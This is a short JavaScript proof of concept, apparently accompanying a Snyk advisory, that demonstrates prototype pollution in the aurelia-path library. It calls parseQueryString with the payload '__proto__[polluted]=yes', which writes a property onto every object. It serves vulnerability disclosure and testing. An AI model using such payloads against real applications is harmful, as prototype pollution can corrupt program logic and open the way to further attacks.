//https://security.snyk.io/vuln/SNYK-JS-AURELIAPATH-1292346
 
  const ap = require("aurelia-path");

   

  ap.parseQueryString("__proto__[polluted]=yes");
// End of file
